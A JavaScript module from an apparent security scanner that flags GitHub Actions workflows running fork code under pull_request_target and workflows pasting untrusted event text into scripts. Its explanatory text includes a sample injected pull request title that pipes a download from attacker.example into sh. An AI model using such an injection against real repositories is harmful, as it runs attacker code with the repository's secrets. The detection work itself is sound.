import fs from './read-boundary.js';
import path from 'node:path';

// GitHub Actions "pwn request": a workflow started by pull_request_target runs with the base
// repository's secrets and a write token, and if it checks out the pull request's code and then
// runs anything (npm install runs the PR's own scripts), a fork's author runs their code with
// those secrets. Mobile repositories hold the keys to the stores here (EXPO_TOKEN, App Store
// Connect, Play service accounts). Jellyfin's iOS app lost exactly these this way
// (GHSA-7qhm-2m45-7fmh). Jobs that only run for the repository's own branches, or that need an
// environment approval, are left alone.

const SAME_REPO = /user\.login\s*==|head\.repo\.full_name\s*==\s*github\.repository|github\.repository\s*==\s*github\.event\.pull_request\.head\.repo\.full_name|!\s*github\.event\.pull_request\.head\.repo\.fork|head\.repo\.fork\s*==\s*false|event_name\s*!=\s*'pull_request_target'|event_name\s*==\s*'pull_request'(?!_)|contains\(\s*github\.event\.pull_request\.labels|github\.actor\s*==|author_association\s*==\s*'(?:OWNER|MEMBER|COLLABORATOR)'/;
const HEAD_REF = /github\.event\.pull_request\.head\.(?:sha|ref)|github\.head_ref|refs\/pull\/|github\.event\.pull_request\.merge_commit_sha/;

// Splits a workflow into jobs: [{ name, text, line }]. Indentation-based; enough for the job,
// step and `if:` structure used here.
function jobs(text) {
  const lines = text.split('\n');
  const start = lines.findIndex((l) => /^jobs:\s*$/.test(l));
  if (start < 0) return [];
  const out = [];
  let indent = null;
  for (let i = start + 1; i < lines.length; i++) {
    const m = lines[i].match(/^(\s+)([\w-]+):\s*$/);
    if (m && (indent === null || m[1].length === indent)) {
      indent = m[1].length;
      out.push({ name: m[2], line: i + 1, lines: [] });
    } else if (/^\S/.test(lines[i]) && lines[i].trim()) break;
    else if (out.length) out.at(-1).lines.push({ text: lines[i], n: i + 1 });
  }
  return out;
}

// Steps of a job: [{ text, line }], split at "- " items under steps:.
function steps(job) {
  const at = job.lines.findIndex((l) => /^\s+steps:\s*$/.test(l.text));
  if (at < 0) return [];
  const out = [];
  let dash = null;
  for (const l of job.lines.slice(at + 1)) {
    const m = l.text.match(/^(\s*)-\s/);
    if (m && (dash === null || m[1].length === dash)) { dash = m[1].length; out.push({ text: l.text, line: l.n }); }
    else if (out.length) out.at(-1).text += `\n${l.text}`;
  }
  return out;
}

// The repository root: workflows live there even when the app is a sub-folder of a monorepo.
function repoRoot(root) {
  let dir = path.resolve(root);
  for (let i = 0; i < 6; i++) {
    try { if (fs.existsSync(path.join(dir, '.git'))) return dir; } catch { return root; }
    const up = path.dirname(dir);
    if (up === dir) break;
    dir = up;
  }
  return root;
}

export function ciSecurity(appRoot) {
  const root = repoRoot(appRoot);
  const dir = path.join(root, '.github', 'workflows');
  let names = [];
  try { names = fs.readdirSync(dir).filter((n) => /\.ya?ml$/.test(n)); } catch { return []; }
  const hits = [];
  for (const name of names) {
    let text = '';
    try { text = fs.readFileSync(path.join(dir, name), 'utf8'); } catch { continue; }
    const on = text.split(/^jobs:/m)[0];
    if (!/pull_request_target/.test(on.replace(/#[^\n]*/g, ''))) continue;
    const all = jobs(text.replace(/(^|\s)#[^\n]*/g, '$1'));
    const headOf = (job) => job.lines.slice(0, job.lines.findIndex((l) => /^\s+steps:\s*$/.test(l.text)) + 1 || undefined).map((l) => l.text).join('\n');
    const needsOf = (job) => { const h = headOf(job); const m = h.match(/^\s+needs:\s*(\[[^\]]*\]|[\w-]+)/m); return m ? m[1].replace(/[[\]\s]/g, '').split(',').filter(Boolean) : []; };
    // A job is gated when it, or a job it needs, requires an environment (approval) or only runs for
    // the repository's own branches: a skipped or waiting job holds back the jobs that need it.
    const gated = (job, seen = new Set()) => {
      if (seen.has(job.name)) return false;
      seen.add(job.name);
      const h = headOf(job);
      if (/^\s+environment:/m.test(h) || (/^\s+if:/m.test(h) && SAME_REPO.test(h))) return true;
      return needsOf(job).some((n) => { const dep = all.find((j) => j.name === n); return dep && gated(dep, seen); });
    };
    for (const job of all) {
      if (gated(job)) continue;
      const list = steps(job);
      const checkout = list.findIndex((s) => /uses:\s*actions\/checkout@/.test(s.text) && HEAD_REF.test(s.text) && !(/\bif:/.test(s.text) && SAME_REPO.test(s.text)));
      if (checkout < 0) continue;
      const runs = list.slice(checkout + 1).find((s) => /^\s*-?\s*run:|\n\s+run:|uses:\s*\.\//.test(s.text) && !(/\bif:/.test(s.text) && SAME_REPO.test(s.text)));
      if (!runs) continue;
      const secrets = /\$\{\{\s*secrets\.(?!GITHUB_TOKEN\b)/.test(job.lines.map((l) => l.text).join('\n')) || /\$\{\{\s*secrets\.(?!GITHUB_TOKEN\b)/.test(text.split(/^jobs:/m)[0]);
      // The job's token can push code (and so reach every secret) unless permissions are set and
      // none of them is contents: write (or write-all).
      const perms = (headOf(job).match(/^\s+permissions:[\s\S]*?(?=^\s{0,4}\S|\s+steps:)/m) || [])[0] || (`${text.split(/^jobs:/m)[0]}\nend:`.match(/^permissions:[\s\S]*?(?=^\S)/m) || [])[0] || '';
      const canPush = !perms || /write-all|contents:\s*write|actions:\s*write/.test(perms);
      hits.push({ at: `${path.relative(appRoot, path.join(dir, name)).split(path.sep).join('/')}:${list[checkout].line}`, job: job.name, run: runs.line, secrets, canPush, unset: !perms });
    }
  }
  if (!hits.length) return [];
  const worst = hits.some((h) => h.secrets || h.canPush) ? 'critical' : 'high';
  return [
    {
      id: 'ci-pull-request-target-checkout',
      severity: worst,
      area: 'security',
      title: `A pull_request_target workflow runs a fork's code with the repository's ${hits.some((h) => h.secrets) ? 'secrets' : 'write token'} (${hits[0].at})`,
      detail: `${hits.slice(0, 4).map((h) => `${h.at} (job ${h.job}) checks out the pull request and runs a step at line ${h.run}${h.secrets ? ', with secrets in scope' : ''}${h.canPush ? (h.unset ? ', and a token that can push to the repository unless its default token permission is read-only (no permissions: block)' : ', and a token that can push to the repository') : ''}`).join('; ')}. pull_request_target runs in the context of your repository, with its secrets and a token that can write to it, for pull requests from any fork. After checking out the pull request's code, any step that installs or builds it runs code the fork's author wrote (npm and yarn run the package's own scripts). Jellyfin lost its App Store credentials and repository access this way (GHSA-7qhm-2m45-7fmh). Use the pull_request trigger for jobs that run the pull request's code, or limit the job to your own branches (\`if: github.event.pull_request.head.repo.full_name == github.repository\`) or to an environment that needs approval, and rotate secrets the workflow could read. (OWASP MASVS-CODE, supply chain)`,
      fix: { kind: 'security', step: `Do not run pull request code under pull_request_target (${hits.slice(0, 2).map((h) => h.at).join(', ')}): switch to pull_request, or guard the job to same-repository pull requests or an approval environment.` },
      evidence: hits.slice(0, 20).map((h) => ({ file: h.at.split(':')[0], line: Number(h.at.split(':')[1]), role: h.job })),
    },
  ];
}

// Script injection: text anyone can set (a pull request title or body, an issue or comment, a branch
// name, a commit message) written straight into a run: script or a github-script with ${{ }}. The
// expression is pasted into the script before it runs, so a title such as `"; curl … | sh; "`
// runs on the runner. Passing the value through env: and quoting "$VAR" is safe and not reported.
const UNTRUSTED = /\$\{\{\s*(github\.event\.(?:pull_request\.(?:title|body|head\.ref|head\.label|head\.repo\.description)|issue\.(?:title|body)|comment\.body|review\.body|review_comment\.body|discussion\.(?:title|body)|head_commit\.(?:message|author\.(?:name|email))|commits\[[^\]]*\]\.message|workflow_run\.(?:head_branch|display_title|head_commit\.message)|pages\[[^\]]*\]\.page_name)|github\.head_ref)\s*\}\}/;
// Only triggers that run with the repository's secrets and a write token. Under plain
// pull_request a fork already runs its own code without them, so an injection adds nothing.
const PRIVILEGED_TRIGGERS = /\b(?:pull_request_target|issues|issue_comment|pull_request_review_comment|discussion|discussion_comment|workflow_run)\b/;

export function ciScriptInjection(appRoot) {
  const root = repoRoot(appRoot);
  const dir = path.join(root, '.github', 'workflows');
  let names = [];
  try { names = fs.readdirSync(dir).filter((n) => /\.ya?ml$/.test(n)); } catch { return []; }
  const hits = [];
  for (const name of names) {
    let text = '';
    try { text = fs.readFileSync(path.join(dir, name), 'utf8'); } catch { continue; }
    const on = text.split(/^jobs:/m)[0].replace(/#[^\n]*/g, '');
    if (!PRIVILEGED_TRIGGERS.test(on)) continue;
    const privileged = true;
    const all = jobs(text.replace(/(^|\s)#[^\n]*/g, '$1'));
    for (const job of all) {
      // A job only the repository's own branches, a named user or a bot can start.
      const head = job.lines.slice(0, job.lines.findIndex((l) => /^\s+steps:\s*$/.test(l.text)) + 1 || undefined).map((l) => l.text).join('\n');
      if (/^\s+if:/m.test(head) && SAME_REPO.test(head)) continue;
      for (const step of steps(job)) {
        if (/\bif:/.test(step.text) && SAME_REPO.test(step.text)) continue;
        // The script itself: run: and github-script's script:, not with:/env: values.
        const script = step.text.match(/\n?\s*(?:-\s*)?(?:run|script):\s*([\s\S]*?)(?=\n\s*(?:-\s|[\w-]+:\s)|$)/);
        if (!script || !/\brun:|uses:\s*actions\/github-script@/.test(step.text)) continue;
        const m = script[1].match(UNTRUSTED);
        if (!m) continue;
        hits.push({ at: `${path.relative(appRoot, path.join(dir, name)).split(path.sep).join('/')}:${step.line}`, job: job.name, expr: m[1], privileged });
        break;
      }
    }
  }
  if (!hits.length) return [];
  const worst = hits.some((h) => h.privileged) ? 'critical' : 'medium';
  return [
    {
      id: 'ci-script-injection',
      severity: worst,
      area: 'security',
      title: `A workflow pastes ${hits[0].expr.replace(/^github\.(?:event\.)?/, '')} into a script (${hits[0].at}${hits.length > 1 ? ', …' : ''})`,
      detail: `${hits.slice(0, 5).map((h) => `${h.at} (job ${h.job}) uses \${{ ${h.expr} }} in a script${h.privileged ? ', in a workflow that runs with the repository\'s secrets and write token' : ''}`).join('; ')}. GitHub replaces the expression before the script runs, so whoever writes that text (a pull request title, an issue, a comment, a branch name) can add their own commands, e.g. a title of \`"; curl https://attacker.example | sh; "\`. Pass it through env: and quote it: \`env: { TITLE: \${{ ${hits[0].expr} }} }\` then \`echo "$TITLE"\`. Source: https://docs.github.com/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections (OWASP MASVS-CODE, supply chain)`,
      fix: { kind: 'security', step: `Move \${{ ${hits[0].expr} }} out of the script into env: and use the quoted variable (${hits.slice(0, 2).map((h) => h.at).join(', ')}).` },
      evidence: hits.slice(0, 20).map((h) => ({ file: h.at.split(':')[0], line: Number(h.at.split(':')[1]), role: h.expr })),
    },
  ];
}
